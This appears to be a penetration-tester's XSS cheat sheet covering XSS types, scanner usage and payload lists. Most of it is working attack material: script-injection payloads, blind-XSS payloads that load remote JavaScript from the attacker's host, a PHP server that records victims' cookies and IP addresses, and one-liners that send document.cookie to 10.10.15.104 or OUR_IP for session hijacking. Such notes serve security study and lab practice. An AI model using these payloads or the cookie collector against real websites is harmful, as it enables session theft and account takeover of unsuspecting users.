## Types of XSS
| Type                             | Description                                                                                                                                                                                                                                  |
| -------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Stored (Persistent) XSS`        | Occurs when user input is stored on the back-end database and then displayed upon retrieval (e.g., posts or comments)                                                                                                                        |
| `Reflected (Non-Persistent) XSS` | Occurs when user input is displayed on the page after being processed by the backend server, but without being stored (e.g., search result or error message)                                                                                 |
| `DOM-based XSS`                  | Another Non-Persistent XSS type that occurs when user input is directly shown in the browser and is completely processed on the client-side, without reaching the back-end server (e.g., through client-side HTTP parameters or anchor tags) |
## Automated tools
Some of the common open-source tools that can assist us in XSS discovery are [XSS Strike](https://github.com/s0md3v/XSStrike), [Brute XSS](https://github.com/rajeshmajumdar/BruteXSS), and [XSSer](https://github.com/epsylon/xsser).
```shell
python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"
```
## Payloads
```html
<script>alert(window.origin)</script>
<script>alert(document.cookie)</script>
<script>print()</script>
<img src="" onerror=alert(window.origin)>
' onerror=alert(1)><
'><script>alert(1)</script>
"><script>alert(1)</script>
"><script>new Image().src='http://10.10.15.104/index.php?c='+document.cookie</script>
```
 [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md)
 [PayloadBox](https://github.com/payloadbox/xss-payload-list)

## Blind XSS to Session Hijacking
#### Loading a Remote Script to identify vulnerable field
```html
<script src="http://OUR_IP/script.js"></script>

# We can use these payloads to know which field is vulnerable
<script src="http://OUR_IP/username"></script>
<script src="http://OUR_IP/password"></script>
<script src="http://OUR_IP/Text"></script>
```
#### Payload to test
```html
<script src=http://OUR_IP></script>
'><script src=http://OUR_IP></script>
"><script src=http://OUR_IP></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
<script>$.getScript("http://OUR_IP")</script>
```

#### Create PHP web server
```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```
Run
```shell
mkdir server
cd server
vim index.php # write php server
sudo php -S 0.0.0.0:80 
```
#### Session hijacking
Put one of these payload inside XSS payloads
```js
document.location='http://OUR_IP/index.php?c='+document.cookie;
new Image().src='http://OUR_IP/index.php?c='+document.cookie;
```

```javascript
"><script>new Image().src='http://10.10.15.104/index.php?c='+document.cookie</script>
```
## Tips
*Note*: To see updated source code with DOM XSS: We can still view the rendered page source with the Web Inspector tool by clicking `CTRL+SHIFT+C`
*Note*: If there is no sanitization after these functions:
- `document.write()`
- `DOM.innerHTML`
- `DOM.outerHTML`
There will be a DOM XSS
```javascript
document.getElementById("todo").innerHTML = "<b>Next Task:</b> " + decodeURIComponent(task);
```
*Note*: XSS can be injected into any input in the HTML page, which is not exclusive to HTML input fields, but may also be in HTTP headers like the Cookie or User-Agent (i.e., when their values are displayed on the page).